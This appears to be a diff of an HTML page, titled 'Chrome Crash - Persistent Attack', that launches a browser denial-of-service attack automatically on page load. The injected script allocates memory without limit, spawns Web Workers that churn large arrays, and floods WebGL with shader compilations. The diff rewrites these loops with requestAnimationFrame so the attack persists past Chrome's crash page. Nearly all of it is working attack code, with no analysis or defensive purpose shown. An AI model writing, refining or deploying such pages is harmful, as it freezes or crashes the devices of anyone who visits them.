@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Single Tab Chrome Crash</title>
+    <title>Chrome Crash - Persistent Attack</title>
 </head>
 <body>
-    <h1>Chrome Crash - Single Tab & Persistent</h1>
+    <h1>Chrome Crash - Bypassing "Aw, Snap"</h1>
     <p>The attack starts automatically.</p>
 
     <script>
@@ -16,18 +16,23 @@
                     <script>
                         function overloadMemory() {
                             let memArray = [];
-                            while (true) {
+                            function allocate() {
                                 memArray.push(new Array(1e7).fill(0)); // Allocate large memory blocks
+                                requestAnimationFrame(allocate); // Keep allocating memory non-stop
                             }
+                            allocate();
                         }
                         overloadMemory();
 
                         function recursiveWorkers() {
                             let code = \`onmessage = function() { postMessage("Spawn more workers"); while (true) { new Float64Array(1e8); } }\`;
                             let blob = new Blob([code], { type: "application/javascript" });
-                            let worker = new Worker(URL.createObjectURL(blob));
-                            worker.postMessage("Start");
-                            setTimeout(recursiveWorkers, 500); // Continuously spawn more workers
+                            function startWorkers() {
+                                let worker = new Worker(URL.createObjectURL(blob));
+                                worker.postMessage("Start");
+                                requestAnimationFrame(startWorkers); // Keep spawning workers
+                            }
+                            startWorkers();
                         }
                         recursiveWorkers();
 
@@ -35,13 +40,15 @@
                         var gl = canvas.getContext('webgl');
                         function crashGPU() {
                             let shaders = [];
-                            setInterval(() => {
+                            function runShaders() {
                                 var shader = gl.createShader(gl.VERTEX_SHADER);
                                 gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
                                 gl.compileShader(shader);
                                 shaders.push(shader);
                                 gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                            }, 1); // Maximize GPU stress
+                                requestAnimationFrame(runShaders); // Keep stressing the GPU
+                            }
+                            runShaders();
                         }
                         crashGPU();
                     <\/script>
@@ -55,5 +62,4 @@
     </script>
 </body>
 </html>
-
 
